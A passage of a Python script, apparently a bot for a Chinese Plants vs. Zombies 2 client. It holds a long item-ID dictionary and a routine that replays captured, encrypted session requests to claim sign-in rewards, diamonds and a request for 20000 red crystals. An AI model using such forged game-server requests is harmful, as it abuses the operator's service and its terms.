{'32001540': '魔术帽(远程职业Ⅲ)伴生装扮', 'pinzhi': 'default'},
{'32001550': '魔术帽(远程职业Ⅳ)伴生装扮', 'pinzhi': 'default'},
{'32001560': '魔术帽(远程职业Ⅴ)伴生装扮', 'pinzhi': 'default'},
{'32001660': '秦始皇陵魔音甜菜伴生装扮', 'pinzhi': 'default'},
{'32001680': '秦始皇陵胡萝卜导弹车伴生装扮', 'pinzhi': 'default'},
{'32001710': '向日葵僵尸伴生装扮', 'pinzhi': 'default'},
{'32001730': '42号毁灭菇伴生装扮', 'pinzhi': 'default'},
{'32001740': '42号菠萝蜜帝伴生装扮', 'pinzhi': 'default'},
{'32001800': '阳光鼠尾草伴生装扮', 'pinzhi': 'default'},
{'32001810': '复制松果伴生装扮', 'pinzhi': 'default'},
{'30010026': '向日葵萌映心梦超级装扮', 'pinzhi': 'default'},
{'30010084': '双胞向日葵刀叉装扮', 'pinzhi': 'default'},
{'30010223': '闪电芦苇麦克风装扮', 'pinzhi': 'default'},
{'30011251': '豌豆荚3D眼镜装扮', 'pinzhi': 'default'},
{'30010275': '双重射手赤子童心超级装扮', 'pinzhi': 'default'},
{'30010402': '星星果假装天使装扮', 'pinzhi': 'default'},
{'30010492': '小喷菇混的菇装扮', 'pinzhi': 'default'},
{'31110212': '火焰花女王发条装扮', 'pinzhi': 'default'},
{'31110491': '白瓜相扑手小书包装扮', 'pinzhi': 'default'},
{'31112721': '寒冰醋栗护目镜装扮', 'pinzhi': 'default'},
{'32000481': '突击竹兵路障装扮', 'pinzhi': 'default'},
{'32000514': '激光皇冠花暮隐魂灯超级装扮', 'pinzhi': 'default'},
{'32000551': '豌豆药剂师红眼镜装扮', 'pinzhi': 'default'},
{'32000651': '流星花假装恶魔装扮', 'pinzhi': 'default'},
{'32000663': '曼德拉草飞翼装扮', 'pinzhi': 'default'},
{'32000693': '粉丝心叶兰四面八汤超级装扮', 'pinzhi': 'default'},
{'32000711': '蜜蜂铃兰尖头帽装扮', 'pinzhi': 'default'},
{'32000931': '疯狂炮仗花成长装扮', 'pinzhi': 'default'},
{'32001283': '守卫菇猎魔牛仔超级装扮', 'pinzhi': 'default'},
{'32001572': '胆小菇星夜伴眠原色装扮', 'pinzhi': 'default'},
{'32001573': '胆小菇星夜伴眠幻彩装扮', 'pinzhi': 'default'},
{'32001593': '太极木槿女仆装幻彩装扮', 'pinzhi': 'default'},
{'32001621': '叶子保护伞伞伞装扮', 'pinzhi': 'default'},
{'32001633': '鸭梨被遗忘之王装扮', 'pinzhi': 'default'},
{'32001642': '金蝉花小风车装扮', 'pinzhi': 'default'},
{'32001701': '悬浮洋芋太空土豆装扮', 'pinzhi': 'default'},
{'32001721': '祥云飞莲蝴蝶结装扮', 'pinzhi': 'default'},
{'32001751': '吸金磁拉夫领装扮', 'pinzhi': 'default'},
{'32001791': '冰川菇白胡子装扮', 'pinzhi': 'default'},
{'400000': '普通僵尸', 'pinzhi': 'default'},
{'400001': '僵尸鸡', 'pinzhi': 'default'},
{'400002': '报纸僵尸', 'pinzhi': 'default'},
{'400003': '机枪豌豆僵尸', 'pinzhi': 'default'},
{'400004': '全明星僵尸', 'pinzhi': 'default'},
{'400005': '电磁盾僵尸', 'pinzhi': 'default'},
{'400006': '章鱼僵尸', 'pinzhi': 'default'},
{'400007': '功夫铜人僵尸', 'pinzhi': 'default'},
{'400008': '铁桶僵尸', 'pinzhi': 'default'},
{'400009': '矿工僵尸', 'pinzhi': 'default'},
{'400010': '冰鼬', 'pinzhi': 'default'},
{'400011': '罗马攻城车僵尸', 'pinzhi': 'default'},
{'400012': '路障僵尸', 'pinzhi': 'default'},
{'400013': '探险家僵尸', 'pinzhi': 'default'},
{'400015': '机器牛僵尸', 'pinzhi': 'default'},
{'400016': '魔法师僵尸', 'pinzhi': 'default'},
{'400017': '气球僵尸', 'pinzhi': 'default'},
{'400018': '飞行器僵尸', 'pinzhi': 'default'},
{'400019': '爆炸坚果僵尸', 'pinzhi': 'default'},
{'400020': '巨人僵尸', 'pinzhi': 'default'},
{'400021': '冰砖僵尸', 'pinzhi': 'default'},
{'400022': '寒冰豌豆僵尸', 'pinzhi': 'default'},
{'400023': '贝壳僵尸', 'pinzhi': 'default'},
{'400024': '侏罗纪野人僵尸', 'pinzhi': 'default'},
{'400025': '失落发掘者', 'pinzhi': 'default'},
{'400026': '儿童节气球僵尸', 'pinzhi': 'default'},
{'400027': '渡渡鸟骑士僵尸', 'pinzhi': 'default'},
{'400028': '冲浪僵尸', 'pinzhi': 'default'},
{'400029': '辣椒僵尸', 'pinzhi': 'default'},
{'400030': '阴阳师僵尸', 'pinzhi': 'default'},
{'400031': '喝酒僵尸', 'pinzhi': 'default'},
{'400032': '盗贼僵尸', 'pinzhi': 'default'},
{'400033': '玩具车僵尸', 'pinzhi': 'default'},
{'400034': '自爆僵尸', 'pinzhi': 'default'},
{'400035': '治愈者僵尸', 'pinzhi': 'default'},
{'400036': '忍者小鬼僵尸', 'pinzhi': 'default'},
{'400037': '猎人僵尸', 'pinzhi': 'default'},
{'400038': '周日版僵尸', 'pinzhi': 'default'},
{'400039': '失落阳伞僵尸', 'pinzhi': 'default'},
{'400040': '冰风酋长僵尸', 'pinzhi': 'default'},
{'400041': '机甲路障僵尸', 'pinzhi': 'default'},
{'400042': '失落考古学家', 'pinzhi': 'default'},
{'400043': '绅士僵尸', 'pinzhi': 'default'},
{'400044': '穴居僵尸', 'pinzhi': 'default'},
{'400045': '闪动僵尸', 'pinzhi': 'default'},
{'400046': '大刀武僧僵尸', 'pinzhi': 'default'},
{'400047': '火把武僧僵尸', 'pinzhi': 'default'},
{'400048': '鸡贼僵尸', 'pinzhi': 'default'},
{'400049': '小丑僵尸', 'pinzhi': 'default'},
{'400050': '朋克僵尸', 'pinzhi': 'default'},
{'400051': '石像僵尸', 'pinzhi': 'default'},
{'400052': '恶龙小鬼僵尸', 'pinzhi': 'default'},
{'400053': '花火僵尸', 'pinzhi': 'default'},
{'400054': '功夫铜锣僵尸', 'pinzhi': 'default'},
{'400055': '骑兵僵尸', 'pinzhi': 'default'},
{'400056': '失落昆虫僵尸', 'pinzhi': 'default'},
{'400057': '海盗船长僵尸', 'pinzhi': 'default'},
{'400058': '锤子僵尸', 'pinzhi': 'default'},
{'400059': '失落医生僵尸', 'pinzhi': 'default'},
{'400060': '功夫气功僵尸', 'pinzhi': 'default'},
{'400061': '农夫僵尸', 'pinzhi': 'default'},
{'400062': '死神僵尸', 'pinzhi': 'default'},
{'400063': '滚桶僵尸', 'pinzhi': 'default'},
{'400064': '淘金僵尸', 'pinzhi': 'default'},
{'400065': '霹雳舞僵尸', 'pinzhi': 'default'},
{'400066': '法老僵尸', 'pinzhi': 'default'},
{'400067': '双截棍武僧僵尸', 'pinzhi': 'default'},
{'400068': '煤矿车僵尸', 'pinzhi': 'default'},
{'400069': '锅炉僵尸', 'pinzhi': 'default'},
{'400070': '机甲巨人僵尸', 'pinzhi': 'default'},
{'400071': '龙骨化石僵尸', 'pinzhi': 'default'},
{'400072': '遗迹猎人僵尸', 'pinzhi': 'default'},
{'400073': '侏罗纪巨人僵尸', 'pinzhi': 'default'},
{'400074': '防爆警察僵尸', 'pinzhi': 'default'},
{'400075': '女巫僵尸', 'pinzhi': 'default'},
{'73111': '火鸡投手基因序列', 'pinzhi': 'default'},
{'73112': '天使星星果基因序列', 'pinzhi': 'default'},
{'73113': '芦藜药师基因序列', 'pinzhi': 'default'},
{'73114': '毒影菇基因序列', 'pinzhi': 'default'},
{'73115': '超级机枪射手基因序列', 'pinzhi': 'default'},
{'73116': '爆裂葡萄基因序列', 'pinzhi': 'default'},
{'73117': '雷龙草基因序列', 'pinzhi': 'default'},
{'73118': '荸荠兄弟基因序列', 'pinzhi': 'default'},
{'73119': '贪吃龙草基因序列', 'pinzhi': 'default'},
{'73120': '原始坚果墙基因序列', 'pinzhi': 'default'},
{'73121': '椰子加农炮基因序列', 'pinzhi': 'default'},
{'73122': '魅惑菇基因序列', 'pinzhi': 'default'},
{'73123': '火焰花女王基因序列', 'pinzhi': 'default'},
{'73124': '原始土豆地雷基因序列', 'pinzhi': 'default'},
{'73125': '茄子忍者基因序列', 'pinzhi': 'default'},
{'73126': '暗樱草基因序列', 'pinzhi': 'default'},
{'73127': '芦笋战机基因序列', 'pinzhi': 'default'},
{'73128': '火柴花拳手基因序列', 'pinzhi': 'default'},
{'73129': '泡泡姬珊瑚基因序列', 'pinzhi': 'default'},
{'73130': '海豌豆基因序列', 'pinzhi': 'default'},
{'73131': '苹果迫击炮基因序列', 'pinzhi': 'default'},
{'73132': '黑法师基因序列', 'pinzhi': 'default'},
{'73133': '机枪石榴基因序列', 'pinzhi': 'default'},
{'73134': '幽灵辣椒基因序列', 'pinzhi': 'default'},
{'73135': '竹小弟基因序列', 'pinzhi': 'default'},
{'73136': '梅小美基因序列', 'pinzhi': 'default'},
{'73137': '阿开木木基因序列', 'pinzhi': 'default'},
{'73138': '旋风橡果基因序列', 'pinzhi': 'default'},
{'73139': '金缕梅女巫基因序列', 'pinzhi': 'default'},
{'73140': '菠萝蜜基因序列', 'pinzhi': 'default'},
{'73141': '旋转枇杷基因序列', 'pinzhi': 'default'},
{'73142': '阳光菇基因序列', 'pinzhi': 'default'},
{'73143': '剑叶龙血树基因序列', 'pinzhi': 'default'},
{'73144': '莲小蓬基因序列', 'pinzhi': 'default'},
{'73145': '海蘑菇基因序列', 'pinzhi': 'default'},
{'73146': '龙吼草基因序列', 'pinzhi': 'default'},
{'73147': '伏僵塔黄基因序列', 'pinzhi': 'default'},
{'83025': '高坚果基因精华', 'pinzhi': 'default'},
{'83027': '棱镜草基因精华', 'pinzhi': 'default'},
{'83038': '飞碟瓜基因精华', 'pinzhi': 'default'},
{'83040': '激光豆基因精华', 'pinzhi': 'default'},
{'83041': '星星果基因精华', 'pinzhi': 'default'},
{'83050': '原始豌豆射手基因精华', 'pinzhi': 'default'},
{'83060': '热辣海藻基因精华', 'pinzhi': 'default'},
{'83061': '芦荟医师基因精华', 'pinzhi': 'default'},
{'83073': '魔术菇基因精华', 'pinzhi': 'default'},
{'83075': '橄榄坑基因精华', 'pinzhi': 'default'},
{'83077': '熊果臼炮基因精华', 'pinzhi': 'default'},
{'83079': '长枪球兰基因精华', 'pinzhi': 'default'},
{'83090': '仙人掌基因精华', 'pinzhi': 'default'},
{'83100': '聚能山竹基因精华', 'pinzhi': 'default'},
{'83103': '回旋镖射手基因精华', 'pinzhi': 'default'},
{'83109': '激光皇冠花基因精华', 'pinzhi': 'default'},
{'83111': '火鸡投手基因精华', 'pinzhi': 'default'},
{'83112': '天使星星果基因精华', 'pinzhi': 'default'},
{'83113': '芦藜药师基因精华', 'pinzhi': 'default'},
{'83114': '毒影菇基因精华', 'pinzhi': 'default'},
{'83115': '超级机枪射手基因精华', 'pinzhi': 'default'},
{'83116': '爆裂葡萄基因精华', 'pinzhi': 'default'},
{'83117': '雷龙草基因精华', 'pinzhi': 'default'},
{'83118': '荸荠兄弟基因精华', 'pinzhi': 'default'},
{'83119': '贪吃龙草基因精华', 'pinzhi': 'default'},
{'83120': '原始坚果墙基因精华', 'pinzhi': 'default'},
{'83121': '椰子加农炮基因精华', 'pinzhi': 'default'},
{'83122': '魅惑菇基因精华', 'pinzhi': 'default'},
{'83123': '火焰花女王基因精华', 'pinzhi': 'default'},
{'83124': '原始土豆地雷基因精华', 'pinzhi': 'default'},
{'83125': '茄子忍者基因精华', 'pinzhi': 'default'},
{'83126': '暗樱草基因精华', 'pinzhi': 'default'},
{'83127': '芦笋战机基因精华', 'pinzhi': 'default'},
{'83128': '火柴花拳手基因精华', 'pinzhi': 'default'},
{'83129': '泡泡姬珊瑚基因精华', 'pinzhi': 'default'},
{'83130': '海豌豆基因精华', 'pinzhi': 'default'},
{'83131': '苹果迫击炮基因精华', 'pinzhi': 'default'},
{'83132': '黑法师基因精华', 'pinzhi': 'default'},
{'83133': '机枪石榴基因精华', 'pinzhi': 'default'},
{'83134': '幽灵辣椒基因精华', 'pinzhi': 'default'},
{'83135': '竹小弟基因精华', 'pinzhi': 'default'},
{'83136': '梅小美基因精华', 'pinzhi': 'default'},
{'83137': '阿开木木基因精华', 'pinzhi': 'default'},
{'83138': '旋风橡果基因精华', 'pinzhi': 'default'},
{'83139': '金缕梅女巫基因精华', 'pinzhi': 'default'},
{'83140': '菠萝蜜基因精华', 'pinzhi': 'default'},
{'83141': '旋转枇杷基因精华', 'pinzhi': 'default'},
{'83142': '阳光菇基因精华', 'pinzhi': 'default'},
{'83143': '剑叶龙血树基因精华', 'pinzhi': 'default'},
{'83144': '莲小蓬基因精华', 'pinzhi': 'default'},
{'83145': '海蘑菇基因精华', 'pinzhi': 'default'},
{'83146': '龙吼草基因精华', 'pinzhi': 'default'},
{'83147': '伏僵塔黄基因精华', 'pinzhi': 'default'},
{'25000': '？头像', 'pinzhi': 'default'},
{'25370': '魔豆收藏家(厨师杓兰)头像', 'pinzhi': 'default'},
{'25790': '冰原猎手头像', 'pinzhi': 'default'},
{'25791': '圣诞节秘境征服者头像', 'pinzhi': 'default'},
{'25792': '魔豆收藏家(守卫菇)头像', 'pinzhi': 'default'},
{'25793': '限时召唤金奖(鸭梨)头像', 'pinzhi': 'default'},
{'25794': '限时召唤银奖(鸭梨)头像', 'pinzhi': 'default'},
{'25795': '限时召唤铜奖(鸭梨)头像', 'pinzhi': 'default'},
{'25796': '限时召唤参与者Ⅰ(鸭梨)头像', 'pinzhi': 'default'},
{'25797': '限时召唤参与者Ⅱ(鸭梨)头像', 'pinzhi': 'default'},
{'25798': '限时召唤参与者Ⅲ(鸭梨)头像', 'pinzhi': 'default'},
{'25799': '限时召唤纪念(鸭梨)头像', 'pinzhi': 'default'},
{'25800': '辞旧迎新头像', 'pinzhi': 'default'},
{'25801': '含家团圆头像', 'pinzhi': 'default'},
{'25802': '回转星空头像', 'pinzhi': 'default'},
{'25803': '桃喜忙忙头像', 'pinzhi': 'default'},
{'25804': '魔豆收藏家(太极木槿)头像', 'pinzhi': 'default'},
{'25805': '趣味博弈头像', 'pinzhi': 'default'},
{'25806': '碧红璀璨头像', 'pinzhi': 'default'},
{'25807': '凛冬将至头像', 'pinzhi': 'default'},
{'25808': '金鞍贺岁头像', 'pinzhi': 'default'},
{'25809': '地宫征服者头像', 'pinzhi': 'default'},
{'25810': '百变联盟头像', 'pinzhi': 'default'},
{'25811': '红运临门头像', 'pinzhi': 'default'},
{'25812': "'不离不弃'粉钻头像", 'pinzhi': 'default'},
{'25813': "'如意如意'玉如意头像", 'pinzhi': 'default'},
{'25814': '财亨幻梦头像', 'pinzhi': 'default'},
{'25815': '高光时刻头像', 'pinzhi': 'default'},
{'25816': '百炼真经头像', 'pinzhi': 'default'},
{'25817': '鞭火连天头像', 'pinzhi': 'default'},
{'25818': '双刃成行头像', 'pinzhi': 'default'},
{'25819': '限时召唤金奖(藕花白龙)头像', 'pinzhi': 'default'},
{'25820': '限时召唤银奖(藕花白龙)头像', 'pinzhi': 'default'},
{'25821': '限时召唤铜奖(藕花白龙)头像', 'pinzhi': 'default'},
{'25822': '限时召唤参与者Ⅰ(藕花白龙)头像', 'pinzhi': 'default'},
{'25823': '限时召唤参与者Ⅱ(藕花白龙)头像', 'pinzhi': 'default'},
{'25824': '限时召唤参与者Ⅲ(藕花白龙)头像', 'pinzhi': 'default'},
{'25825': '限时召唤纪念(藕花白龙)头像', 'pinzhi': 'default'},
{'25826': '魔豆收藏家(毁灭菇)头像', 'pinzhi': 'default'},
{'25827': '魔豆收藏家(鸭梨)头像', 'pinzhi': 'default'},
{'25828': '限时召唤金奖(悬浮洋芋)头像', 'pinzhi': 'default'},
{'25829': '限时召唤银奖(悬浮洋芋)头像', 'pinzhi': 'default'},
{'25830': '限时召唤铜奖(悬浮洋芋)头像', 'pinzhi': 'default'},
{'25831': '限时召唤参与者Ⅰ(悬浮洋芋)头像', 'pinzhi': 'default'},
{'25832': '限时召唤参与者Ⅱ(悬浮洋芋)头像', 'pinzhi': 'default'},
{'25833': '限时召唤参与者Ⅲ(悬浮洋芋)头像', 'pinzhi': 'default'},
{'25834': '限时召唤纪念(悬浮洋芋)头像', 'pinzhi': 'default'},
{'25835': '森罗万象头像', 'pinzhi': 'default'},
{'25836': '欢愉开幕头像', 'pinzhi': 'default'},
{'25837': '燕街春桃头像', 'pinzhi': 'default'},
{'25838': '春与阳共舞头像', 'pinzhi': 'default'},
{'25839': '不战止戈头像', 'pinzhi': 'default'},
{'25840': '丝路寻迹头像', 'pinzhi': 'default'},
{'25841': '真假土豆头像', 'pinzhi': 'default'},
{'25842': '僵尸召唤师头像', 'pinzhi': 'default'},
{'25843': '妙取横胜头像', 'pinzhi': 'default'},
{'25844': '煌铃照月头像', 'pinzhi': 'default'},
{'25845': '胖蜂舞曲头像', 'pinzhi': 'default'},
{'25846': '拷斯谱蕾头像', 'pinzhi': 'default'},
{'25847': '闪耀礼仪头像', 'pinzhi': 'default'},
{'25848': '欢乐观影头像', 'pinzhi': 'default'},
{'25849': '迷你游戏新手头像', 'pinzhi': 'default'},
{'25850': '迷你游戏达人头像', 'pinzhi': 'default'},
{'25851': '迷你游戏高手头像', 'pinzhi': 'default'},
{'25852': '迷你游戏宗师头像', 'pinzhi': 'default'},
{'25853': '精打细算头像', 'pinzhi': 'default'},
{'25854': '砸罐学徒头像', 'pinzhi': 'default'},
{'25855': '砸罐工匠头像', 'pinzhi': 'default'},
{'25856': '砸罐大师头像', 'pinzhi': 'default'},
{'25857': '限时召唤金奖(祥云飞莲)头像', 'pinzhi': 'default'},
{'25858': '限时召唤银奖(祥云飞莲)头像', 'pinzhi': 'default'},
{'25859': '限时召唤铜奖(祥云飞莲)头像', 'pinzhi': 'default'},
{'25860': '限时召唤参与者Ⅰ(祥云飞莲)头像', 'pinzhi': 'default'},
{'25861': '限时召唤参与者Ⅱ(祥云飞莲)头像', 'pinzhi': 'default'},
{'25862': '限时召唤参与者Ⅲ(祥云飞莲)头像', 'pinzhi': 'default'},
{'25863': '限时召唤纪念(祥云飞莲)头像', 'pinzhi': 'default'},
{'25864': '群星还愿头像', 'pinzhi': 'default'},
{'25865': '幽邃惊魂头像', 'pinzhi': 'default'},
{'25866': '万物有灵头像', 'pinzhi': 'default'},
{'25867': '西域梵音头像', 'pinzhi': 'default'},
{'25868': '地宫迂回头像', 'pinzhi': 'default'},
{'25869': '恶魔之影头像', 'pinzhi': 'default'},
{'25870': '限时召唤金奖(冰川菇)头像', 'pinzhi': 'default'},
{'25871': '限时召唤银奖(冰川菇)头像', 'pinzhi': 'default'},
{'25872': '限时召唤铜奖(冰川菇)头像', 'pinzhi': 'default'},
{'25873': '限时召唤参与者Ⅰ(冰川菇)头像', 'pinzhi': 'default'},
{'25874': '限时召唤参与者Ⅱ(冰川菇)头像', 'pinzhi': 'default'},
{'25875': '限时召唤参与者Ⅲ(冰川菇)头像', 'pinzhi': 'default'},
{'25876': '限时召唤纪念(冰川菇)头像', 'pinzhi': 'default'},
{'25877': '魔豆收藏家(藕花白龙)头像', 'pinzhi': 'default'},
{'25878': '测试先锋头像', 'pinzhi': 'default'},
{'25879': '魔力药剂头像', 'pinzhi': 'default'},
{'25880': '随风远行头像', 'pinzhi': 'default'},
{'25881': '限时召唤金奖(阳光鼠尾草)头像', 'pinzhi': 'default'},
{'25882': '限时召唤银奖(阳光鼠尾草)头像', 'pinzhi': 'default'},
{'25883': '限时召唤铜奖(阳光鼠尾草)头像', 'pinzhi': 'default'},
{'25884': '限时召唤参与者Ⅰ(阳光鼠尾草)头像', 'pinzhi': 'default'},
{'25885': '限时召唤参与者Ⅱ(阳光鼠尾草)头像', 'pinzhi': 'default'},
{'25886': '限时召唤参与者Ⅲ(阳光鼠尾草)头像', 'pinzhi': 'default'},
{'25887': '限时召唤纪念(阳光鼠尾草)头像', 'pinzhi': 'default'},
{'25888': '魔豆收藏家(金蝉花)头像', 'pinzhi': 'default'},
{'25889': '足球小将头像', 'pinzhi': 'default'},
{'25890': '一击倒地头像', 'pinzhi': 'default'},
{'25891': '极地生菜头像', 'pinzhi': 'default'},
{'25892': '魔豆收藏家(冰川菇)头像', 'pinzhi': 'default'},
{'25893': '魔豆收藏家(祥云飞莲)头像', 'pinzhi': 'default'},
{'25894': '闪耀巨星头像', 'pinzhi': 'default'},
{'25895': '暮夜诡火头像', 'pinzhi': 'default'},
{'25896': '湖清绽莲头像', 'pinzhi': 'default'},
{'25897': '星夜好眠头像', 'pinzhi': 'default'},
{'25898': '冰火冰火冰头像', 'pinzhi': 'default'},
{'25899': '豌若游龙头像', 'pinzhi': 'default'},
{'25900': '奇幻包菜头像', 'pinzhi': 'default'},
{'25901': '积木行军头像', 'pinzhi': 'default'},
{'25902': '夏日浪行头像', 'pinzhi': 'default'},
{'25903': '彩绘世界头像', 'pinzhi': 'default'},
{'25904': '影焰燃灯头像', 'pinzhi': 'default'},
{'25905': '限时召唤金奖(复制松果)头像', 'pinzhi': 'default'},
{'25906': '限时召唤银奖(复制松果)头像', 'pinzhi': 'default'},
{'25907': '限时召唤铜奖(复制松果)头像', 'pinzhi': 'default'},
{'25908': '限时召唤参与者Ⅰ(复制松果)头像', 'pinzhi': 'default'},
{'25909': '限时召唤参与者Ⅱ(复制松果)头像', 'pinzhi': 'default'},
{'25910': '限时召唤参与者Ⅲ(复制松果)头像', 'pinzhi': 'default'},
{'25911': '限时召唤纪念(复制松果)头像', 'pinzhi': 'default'},
{'97001': '长枪球兰体验卡(3天)', 'pinzhi': 'default'},
{'97002': '流星花体验卡(3天)', 'pinzhi': 'default'},
{'97003': '杜英投手体验卡(3天)', 'pinzhi': 'default'},
{'97004': '黄油毛茛体验卡(3天)', 'pinzhi': 'default'},
{'97005': '鹤草击剑手体验卡(3天)', 'pinzhi': 'default'},
{'97006': '双生卯兔体验卡(3天)', 'pinzhi': 'default'},
{'97007': '刺果流星锤体验卡(3天)', 'pinzhi': 'default'},
{'97008': '爆炸桔梗体验卡(3天)', 'pinzhi': 'default'},
{'97009': '火焰花女王体验卡(14天)', 'pinzhi': 'default'},
{'97010': '机枪豌豆射手体验卡(14天)', 'pinzhi': 'default'},
{'97011': '电能豌豆射手体验卡(14天)', 'pinzhi': 'default'},
{'97012': '毒液豌豆射手体验卡(14天)', 'pinzhi': 'default'},
{'97013': '僵尸豆荚体验卡(14天)', 'pinzhi': 'default'},
{'97014': '吸血牛杆菌体验卡(14天)', 'pinzhi': 'default'},
{'97015': '突击竹兵体验卡(14天)', 'pinzhi': 'default'},
{'97016': '荸荠兄弟体验卡(14天)', 'pinzhi': 'default'},
{'97017': '虎头菇体验卡(14天)', 'pinzhi': 'default'},
{'97018': '蜜蜂铃兰体验卡(14天)', 'pinzhi': 'default'},
{'97019': '酷跑曼德拉体验卡(14天)', 'pinzhi': 'default'},
{'97020': '寄生仙钗体验卡(14天)', 'pinzhi': 'default'},
{'97021': '聚能山竹体验卡(14天)', 'pinzhi': 'default'},
{'97022': '冰西瓜投手体验卡(14天)', 'pinzhi': 'default'},
{'97023': '烈焰火蕨体验卡(14天)', 'pinzhi': 'default'},
{'97024': '突击竹兵体验卡(14天)', 'pinzhi': 'default'},
{'97025': '荸荠兄弟体验卡(14天)', 'pinzhi': 'default'},
{'97026': '虎头菇体验卡(14天)', 'pinzhi': 'default'},
{'97027': '电击钩吻体验卡(3天)', 'pinzhi': 'default'},
{'97028': '油菜花投手体验卡(3天)', 'pinzhi': 'default'},
{'97029': '虎头菇体验卡(3天)', 'pinzhi': 'default'},
{'97030': '日月金银花体验卡(3天)', 'pinzhi': 'default'},
{'97031': '泡泡姬珊瑚体验卡(3天)', 'pinzhi': 'default'},
{'97032': '小黄梨体验卡(3天)', 'pinzhi': 'default'},
{'97033': '寒霜白毛丹体验卡(3天)', 'pinzhi': 'default'},
{'97034': '女娲蛇尾草体验卡(3天)', 'pinzhi': 'default'},
{'97035': '女娲蛇尾草体验卡(14天)', 'pinzhi': 'default'},
{'97036': '粉丝心叶兰体验卡(14天)', 'pinzhi': 'default'},
{'97037': '日月金银花体验卡(14天)', 'pinzhi': 'default'},
{'97038': '聚能山竹体验卡(14天)', 'pinzhi': 'default'},
{'97039': '冰西瓜投手体验卡(14天)', 'pinzhi': 'default'},
{'97040': '烈焰火蕨体验卡(14天)', 'pinzhi': 'default'},
{'97041': '天使星星果体验卡(14天)', 'pinzhi': 'default'},
{'97042': '荸荠兄弟体验卡(14天)', 'pinzhi': 'default'},
{'97043': '双生卯兔体验卡(14天)', 'pinzhi': 'default'},
{'360': '360', 'pinzhi': 'default'},
{'1': '360_sms', 'pinzhi': 'default'},
{'2': '360_capture', 'pinzhi': 'default'},
{'3': '360_password', 'pinzhi': 'default'}]

for item in plant_list:
    for plant_id, name in item.items():
        if plant_id != "pinzhi":
            formatted_plant[plant_id] = {
                "name": name,
                "pinzhi": item.get("pinzhi", "default"),
                "jieshu": item.get("jieshu", "5")}

load_remote_dicts()

def run_first_script():
    try:
        pi, ui, sk = get_pi_sk(加密)
        data = {"req":"V303","e":{"al":[{"id":10710,"abi":0,"type":1,"config_version":1}],"ci":"93","cs":"0","pack":渠道,"pi":pi,"sk":sk,"ui":ui,"v":版本号},"ev":3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        decrypted_response = get_decrypted_data(url, data=response)
        decrypted_json = json.loads(decrypted_response)
        if response_data.get("r") == 20013:
            print("请求文本已过期")
        elif response_data.get("r") == 0:
            print("7天累计签到刷新成功")
        else:
            print("7天累计签到刷新失败")
        op_value = decrypted_json["e"]["d"][0].get("op")
        if op_value == 0 or op_value == None:
            print("活动未开启")
        elif op_value == 1:
            inner_data = json.loads(decrypted_json["e"]["d"][0]["data"])
            ld = int(inner_data['nds']['ld'])
            if ld < 7:
                data = {"req":"V350","e":{"ai":"10710","pi":pi,"sk":sk,"ui":ui},"ev":3}
                encrypted_data, head = get_encrypted_data(data, url)
                response = _do_post(head, encrypted_data, data)
                response_data = json.loads(response.text)
                if response_data.get("r") == 20013:
                    print("当前请求文本已过期，需重新抓包")
                elif response_data.get("r") == 0:
                    print("7天累计签到成功")
                else:
                    print("7天累计签到失败")
            else:
                pass
        data = {"req":"V303","e":{"al":[{"id":10882,"abi":0,"type":1,"config_version":1}],"ci":"93","cs":"0","pack":渠道,"pi":pi,"sk":sk,"ui":ui,"v":版本号},"ev":3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        decrypted_response = get_decrypted_data(url, data=response)
        decrypted_json = json.loads(decrypted_response)
        if response_data.get("r") == 20013:
            print("请求文本已过期")
        elif response_data.get("r") == 0:
            print("大作战刷新成功")
        else:
            print("大作战刷新失败")
        op_value = decrypted_json["e"]["d"][0].get("op")
        if op_value == 0 or op_value == None:
            print("活动未开启")
        elif op_value == 1:
            data = {"req":"V405","e":{"a":"10882","pi":pi,"sk":sk,"ui":ui},"ev":3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            try:
                response_data = json.loads(response.text)
                if response_data.get("r") == 20013:
                    print("请求文本已过期")
                elif response_data.get("r") == 0:
                    print("大作战累计签到成功")
                else:
                    print("大作战累计签到失败")
            except json.JSONDecodeError:
                print("响应数据解析失败")
            time.sleep(0)
        else:
            print(f"未知的op值：{op_value}")
        data = {"req":"V303","e":{"al":[{"id":10897,"abi":0,"type":1,"config_version":1}],"ci":"93","cs":"0","pack":渠道,"pi":pi,"sk":sk,"ui":ui,"v":版本号},"ev":3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 20013:
            print("请求文本已过期")
        elif response_data.get("r") == 0:
            print("庆典礼包刷新成功")
            decrypted_response = get_decrypted_data(url, data=response)
            decrypted_json = json.loads(decrypted_response)
            op_value = decrypted_json["e"]["d"][0].get("op")
            if op_value == 0 or op_value == None:
                print("活动未开启")
            elif op_value == 1:
                data = {"req":"V1112","e":{"key":"0","pi":pi,"sk":sk,"ui":ui},"ev":3}
                encrypted_data, head = get_encrypted_data(data, url)
                response = _do_post(head, encrypted_data, data)
                response_data = json.loads(response.text)
                if response_data.get("r") == 20013:
                    print("当前请求文本已过期，需重新抓包")
                elif response_data.get("r") == 0:
                    print("15钻石领取成功")
                else:
                    print("15钻石领取失败")
        else:
            print("庆典礼包刷新失败")
        data = {"req": "V900", "e": {"pi": pi, "pl": [{"i": 23097, "q": 20000}], "sk": sk, "ui": ui}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 20013:
            print("当前请求文本已过期，需重新抓包")
        elif response_data.get("r") == 0:
            print("每周两万红水晶领取成功")
        else:
            print("每周两万红水晶领取失败")
        data = {"req":"V303","e":{"al":[{"id":10840,"abi":0,"type":1,"config_version":1}],"ci":"93","cs":"0","pack":渠道,"pi":pi,"rv":"5","sk":sk,"ui":ui,"v":版本号},"ev":3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 20013:
            print("当前请求文本已过期，需重新抓包")
        elif response_data.get("r") == 0:
            print("庭院打开成功")
        else:
            print("庭院打开失败")
        data ={"req":"V766","e":{"id":"1","pi":pi,"sk":sk,"ui":ui},"ev":3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 20013:
            print("当前请求文本已过期，需重新抓包")
        elif response_data.get("r") == 46360:
            print("分享奖励已被获取")
